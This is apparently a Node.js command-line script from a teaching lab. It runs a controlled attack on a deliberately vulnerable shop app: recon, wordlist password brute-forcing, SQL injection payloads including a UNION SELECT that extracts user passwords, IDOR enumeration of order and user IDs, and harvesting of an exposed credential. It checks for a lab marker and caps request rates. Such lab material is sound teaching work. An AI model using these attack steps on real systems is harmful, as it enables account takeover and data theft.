#!/usr/bin/env node
// attack-simulation/attack.js
// Script_Ataque: cloud-provider-independent CLI that drives a simulated,
// controlled attack against a SangyShop Variante_Vulneravel instance for
// classroom use (Requirement 13).
//
// Usage:
//   node attack.js --target http://localhost:3000 [--dry-run]
//                   [--rate-rps N] [--total-requests N] [--out DIR]
//
// Exit codes:
//   0  all steps completed
//   2  --target missing or empty (Requirement 13.3)
//   3  usage error (bad flag value)
//   4  target did not pass the lab marker gate (Requirement 13.4)
//   5  unexpected runtime error while running a step
//
// Only ever point this at a SangyShop instance you started yourself, in
// your own isolated lab account. See README.md, section "Security".

const fs = require("fs");
const path = require("path");

const { planSteps } = require("./lib/plan");
const { isLabMarker } = require("./lib/marker");
const { formatStep, summarize } = require("./lib/steplog");
const { request, RateLimiter, sleep } = require("./lib/http");

const OUT_DIR = path.join(__dirname, "out");
const STEP_LOG_PATH = path.join(OUT_DIR, "attack-steps.jsonl");
const CREDENTIAL_PATH = path.join(OUT_DIR, "exposed-credential.json");
const WORDLIST_PATH = path.join(__dirname, "wordlists", "passwords.txt");

function printUsage(stream) {
  stream.write(
    [
      "Usage: node attack.js --target <url> [options]",
      "",
      "Required:",
      "  --target <url>          Base URL of the SangyShop lab instance (e.g. http://localhost:3000)",
      "",
      "Options:",
      "  --dry-run                Plan and log steps without sending real HTTP requests",
      "  --rate-rps <n>            Max requests per second (default 5, hard ceiling 10)",
      "  --total-requests <n>      Max total requests across all steps (default 150, hard ceiling 300)",
      "  --username <name>         Username to target in the bruteforce step (default admin)",
      "  --out <dir>               Output directory for logs and artifacts (default ./out)",
      "  -h, --help                Show this help message",
      "",
    ].join("\n")
  );
}

// Minimal, dependency-free flag parser. Supports --flag value and --flag=value.
function parseArgs(argv) {
  const args = { dryRun: false };
  for (let i = 0; i < argv.length; i++) {
    const token = argv[i];
    if (token === "-h" || token === "--help") {
      args.help = true;
      continue;
    }
    if (token === "--dry-run") {
      args.dryRun = true;
      continue;
    }
    let key = null;
    let inlineValue = null;
    if (token.startsWith("--")) {
      const eqIndex = token.indexOf("=");
      if (eqIndex !== -1) {
        key = token.slice(2, eqIndex);
        inlineValue = token.slice(eqIndex + 1);
      } else {
        key = token.slice(2);
      }
    } else {
      continue;
    }

    let value = inlineValue;
    if (value === null) {
      value = argv[i + 1];
      if (value === undefined || value.startsWith("--")) {
        value = undefined;
      } else {
        i++;
      }
    }

    switch (key) {
      case "target":
        args.target = value;
        break;
      case "rate-rps":
        args.rateRps = value;
        break;
      case "total-requests":
        args.totalRequests = value;
        break;
      case "username":
        args.username = value;
        break;
      case "out":
        args.out = value;
        break;
      default:
        // Unknown flag: ignored to keep the CLI forgiving for future options.
        break;
    }
  }
  return args;
}

function parsePositiveInt(value, flagName) {
  if (value === undefined) return undefined;
  const parsed = Number(value);
  if (!Number.isFinite(parsed) || parsed <= 0 || !Number.isInteger(parsed)) {
    throw new UsageError(`${flagName} must be a positive integer, got: ${value}`);
  }
  return parsed;
}

class UsageError extends Error {}

function ensureOutDir(outDir) {
  fs.mkdirSync(outDir, { recursive: true });
}

function appendStepLine(logPath, line) {
  fs.appendFileSync(logPath, line + "\n", "utf8");
}

function loadWordlist() {
  const text = fs.readFileSync(WORDLIST_PATH, "utf8");
  return text
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => line.length > 0 && !line.startsWith("#"));
}

// Writes the discovered credential to a restricted-permission file and
// never prints its content (Requirement 13.9, 13.2).
function writeExposedCredential(credentialPath, credential) {
  fs.writeFileSync(credentialPath, JSON.stringify(credential, null, 2) + "\n", {
    encoding: "utf8",
    mode: 0o600,
  });
  try {
    fs.chmodSync(credentialPath, 0o600);
  } catch {
    // Best effort: chmod is a no-op on some filesystems (e.g. certain
    // Windows configurations). The file is still written; ownership-based
    // restriction is a lab convenience, not a hard security boundary here.
  }
}

// Runs one step: logs the "start" line, invokes `run(ctx)`, logs the "end"
// line with the outcome, and returns run()'s result (or null on error).
async function runStep(step, target, logPath, run, { dryRun }) {
  const startLine = formatStep({
    step: step.number,
    name: step.name,
    target,
    phase: "start",
  });
  appendStepLine(logPath, startLine);
  process.stdout.write(`[step ${step.number}/${"N"}] ${step.name}: starting\n`);

  let outcome = "ok";
  let requestCount = 0;
  let errorCount = 0;
  let result = null;

  if (dryRun) {
    outcome = "ok";
  } else {
    try {
      const stepResult = await run(step);
      result = stepResult && stepResult.result !== undefined ? stepResult.result : null;
      requestCount = (stepResult && stepResult.requestCount) || 0;
      errorCount = (stepResult && stepResult.errorCount) || 0;
      outcome = (stepResult && stepResult.outcome) || "ok";
    } catch (err) {
      outcome = "error";
      errorCount = 1;
      process.stderr.write(`[step ${step.number}] ${step.name}: error: ${err.message}\n`);
    }
  }

  const endLine = formatStep({
    step: step.number,
    name: step.name,
    target,
    phase: "end",
    outcome,
    requestCount,
    errorCount,
  });
  appendStepLine(logPath, endLine);
  process.stdout.write(`[step ${step.number}] ${step.name}: ${outcome}\n`);

  return { outcome, requestCount, errorCount, result };
}

// Step implementations. Each receives the step definition (with maxRequests)
// and returns { outcome, requestCount, errorCount, result }.

async function stepRecon(step, target, limiter) {
  await limiter.acquire();
  let requestCount = 1;
  let errorCount = 0;
  let outcome = "ok";
  try {
    const response = await request(`${target}/products`, { method: "GET" });
    if (response.status >= 500) errorCount++;
  } catch {
    errorCount++;
    outcome = "error";
  }
  return { outcome, requestCount, errorCount };
}

async function stepBruteforce(step, target, limiter, username, wordlist) {
  let requestCount = 0;
  let errorCount = 0;
  let outcome = "limit-reached";

  for (const password of wordlist) {
    if (requestCount >= step.maxRequests) break;
    await limiter.acquire();
    requestCount++;
    try {
      const response = await request(`${target}/login`, {
        method: "POST",
        headers: { "content-type": "application/x-www-form-urlencoded" },
        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
      });
      if (response.status === 302 || response.status === 200) {
        outcome = "ok";
        break;
      }
      if (response.status >= 500) errorCount++;
    } catch {
      errorCount++;
    }
  }

  if (outcome === "limit-reached" && requestCount < step.maxRequests) {
    outcome = "ok";
  }

  return { outcome, requestCount, errorCount };
}

async function stepSqli(step, target, limiter) {
  const payloads = [
    "' OR '1'='1",
    "' UNION SELECT id,username,password,id FROM users --",
  ];
  let requestCount = 0;
  let errorCount = 0;

  for (const payload of payloads) {
    if (requestCount >= step.maxRequests) break;
    await limiter.acquire();
    requestCount++;
    try {
      const response = await request(`${target}/products?q=${encodeURIComponent(payload)}`, {
        method: "GET",
      });
      if (response.status >= 500) errorCount++;
    } catch {
      errorCount++;
    }
  }

  return { outcome: "ok", requestCount, errorCount };
}

async function stepIdor(step, target, limiter) {
  let requestCount = 0;
  let errorCount = 0;
  const ids = [1, 2, 3, 4, 5];

  for (const id of ids) {
    if (requestCount >= step.maxRequests) break;
    await limiter.acquire();
    requestCount++;
    try {
      const response = await request(`${target}/api/orders/${id}`, { method: "GET" });
      if (response.status >= 500) errorCount++;
    } catch {
      errorCount++;
    }

    if (requestCount >= step.maxRequests) break;
    await limiter.acquire();
    requestCount++;
    try {
      const response = await request(`${target}/api/users/${id}`, { method: "GET" });
      if (response.status >= 500) errorCount++;
    } catch {
      errorCount++;
    }
  }

  return { outcome: "ok", requestCount, errorCount };
}

// Requirement 13.2 / 13.9: this step only reads the Placeholder_Credencial
// exposed by the lab's leaked-config endpoint (src/routes/lab.js, task 6.5).
// It never calls a real cloud API; that is the job of a cloud-specific
// script in aws/ir-lab/ or azure/ir-lab/.
async function stepCredentialDiscovery(step, target, limiter, credentialPath) {
  await limiter.acquire();
  let requestCount = 1;
  let errorCount = 0;
  let outcome = "ok";
  let found = false;

  try {
    const response = await request(`${target}/debug/config`, { method: "GET" });
    if (response.status === 200 && response.body && typeof response.body === "object") {
      ensureOutDir(path.dirname(credentialPath));
      writeExposedCredential(credentialPath, response.body);
      found = true;
    } else if (response.status >= 500) {
      errorCount++;
    }
  } catch {
    errorCount++;
    outcome = "error";
  }

  process.stdout.write(
    found
      ? "[step] credential-discovery: a credential was found and saved to out/exposed-credential.json (content withheld)\n"
      : "[step] credential-discovery: no credential was found\n"
  );

  return { outcome, requestCount, errorCount };
}

async function main(argv) {
  const args = parseArgs(argv);

  if (args.help) {
    printUsage(process.stdout);
    return 0;
  }

  if (!args.target || args.target.trim().length === 0) {
    process.stderr.write("Error: --target is required and must not be empty.\n");
    printUsage(process.stderr);
    return 2;
  }
  const target = args.target.replace(/\/+$/, "");

  let rateRps;
  let totalRequests;
  try {
    rateRps = parsePositiveInt(args.rateRps, "--rate-rps");
    totalRequests = parsePositiveInt(args.totalRequests, "--total-requests");
  } catch (err) {
    if (err instanceof UsageError) {
      process.stderr.write(`Error: ${err.message}\n`);
      return 3;
    }
    throw err;
  }

  let plan;
  try {
    plan = planSteps({
      ...(rateRps !== undefined ? { rateRps } : {}),
      ...(totalRequests !== undefined ? { totalRequests } : {}),
    });
  } catch (err) {
    process.stderr.write(`Error: invalid plan options: ${err.message}\n`);
    return 3;
  }

  const outDir = args.out ? path.resolve(args.out) : OUT_DIR;
  const logPath = args.out ? path.join(outDir, "attack-steps.jsonl") : STEP_LOG_PATH;
  const credentialPath = args.out ? path.join(outDir, "exposed-credential.json") : CREDENTIAL_PATH;
  ensureOutDir(outDir);

  // Requirement 13.4: verify the lab marker BEFORE sending any attack request.
  if (!args.dryRun) {
    let markerResponse;
    try {
      markerResponse = await request(`${target}/.well-known/sangyshop-lab`, { method: "GET" });
    } catch (err) {
      process.stderr.write(
        `Error: could not reach the lab marker endpoint at ${target}/.well-known/sangyshop-lab: ${err.message}\n`
      );
      return 4;
    }
    if (!isLabMarker(markerResponse)) {
      process.stderr.write(
        "Error: target did not pass the lab marker check. Refusing to attack a target that is not an identified SangyShop lab instance.\n"
      );
      return 4;
    }
    process.stdout.write(`Lab marker confirmed for target ${target}. Proceeding.\n`);
  } else {
    process.stdout.write("Dry run: skipping the lab marker check and all real HTTP calls.\n");
  }

  const username = args.username || "admin";
  const wordlist = loadWordlist();
  const limiter = new RateLimiter(plan.rateRps);
  const startedAt = new Date().toISOString();

  for (const step of plan.steps) {
    let outcome;
    switch (step.name) {
      case "recon":
        outcome = await runStep(step, target, logPath, () => stepRecon(step, target, limiter), {
          dryRun: args.dryRun,
        });
        break;
      case "bruteforce":
        outcome = await runStep(
          step,
          target,
          logPath,
          () => stepBruteforce(step, target, limiter, username, wordlist),
          { dryRun: args.dryRun }
        );
        break;
      case "sqli":
        outcome = await runStep(step, target, logPath, () => stepSqli(step, target, limiter), {
          dryRun: args.dryRun,
        });
        break;
      case "idor":
        outcome = await runStep(step, target, logPath, () => stepIdor(step, target, limiter), {
          dryRun: args.dryRun,
        });
        break;
      case "credential-discovery":
        outcome = await runStep(
          step,
          target,
          logPath,
          () => stepCredentialDiscovery(step, target, limiter, credentialPath),
          { dryRun: args.dryRun }
        );
        break;
      default:
        outcome = { outcome: "error", requestCount: 0, errorCount: 0 };
    }

    if (outcome.outcome === "error" && !args.dryRun) {
      process.stderr.write(`[step ${step.number}] ${step.name}: step reported an error, continuing.\n`);
    }
  }

  const finishedAt = new Date().toISOString();
  const rawLines = fs.readFileSync(logPath, "utf8").split("\n");
  const summary = summarize(rawLines);

  process.stdout.write(
    `Attack simulation finished: ${summary.totalSteps} step(s), started ${startedAt}, finished ${finishedAt}.\n`
  );
  process.stdout.write(`Step log written to: ${logPath}\n`);

  return 0;
}

if (require.main === module) {
  main(process.argv.slice(2))
    .then((code) => process.exit(code))
    .catch((err) => {
      process.stderr.write(`Unexpected error: ${err.message}\n`);
      process.exit(5);
    });
}

module.exports = { main, parseArgs };
